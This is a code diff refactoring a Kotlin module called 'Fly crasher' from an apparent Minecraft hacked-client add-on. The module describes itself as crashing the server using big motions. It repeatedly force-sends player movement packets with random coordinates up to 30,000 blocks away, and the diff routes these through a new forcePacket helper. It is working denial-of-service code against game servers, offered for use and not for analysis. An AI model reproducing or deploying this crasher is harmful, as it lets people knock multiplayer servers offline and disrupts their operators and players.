@@ -1,20 +1,15 @@
 package de.florianmichael.tarasande_crasher.module
 
+import de.florianmichael.tarasande_crasher.forcePacket
 import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket
-import net.minecraft.util.math.Vec3d
 import net.tarasandedevelopment.tarasande.event.EventMovement
 import net.tarasandedevelopment.tarasande.event.EventPacket
-import net.tarasandedevelopment.tarasande.injection.accessor.IClientConnection
 import net.tarasandedevelopment.tarasande.mc
 import net.tarasandedevelopment.tarasande.system.base.valuesystem.impl.ValueNumber
 import net.tarasandedevelopment.tarasande.system.feature.modulesystem.Module
-import net.tarasandedevelopment.tarasande.system.feature.modulesystem.ModuleCategory
-import su.mandora.event.EventDispatcher
 import java.util.concurrent.ThreadLocalRandom
-import kotlin.math.cos
-import kotlin.math.sin
 
-class ModuleFlyCrasher : Module("Fly crasher", "Crashes the server using big motions", ModuleCategory.EXPLOIT) {
+class ModuleFlyCrasher : Module("Fly crasher", "Crashes the server using big motions", "Crasher") {
 
     private val repeat = ValueNumber(this, "Repeat", 1.0, 3.0, 10.0, 1.0)
 
@@ -31,7 +26,7 @@ class ModuleFlyCrasher : Module("Fly crasher", "Crashes the server using big mot
                 trackedY = ThreadLocalRandom.current().nextDouble(-30000.0, 30000.0)
                 trackedZ = ThreadLocalRandom.current().nextDouble(-30000.0, 30000.0)
 
-                (mc.networkHandler!!.connection as IClientConnection).tarasande_forceSend(PlayerMoveC2SPacket.PositionAndOnGround(trackedX, trackedY, trackedZ, mc.player!!.isOnGround))
+                forcePacket(PlayerMoveC2SPacket.PositionAndOnGround(trackedX, trackedY, trackedZ, mc.player!!.isOnGround))
             }
         }
 
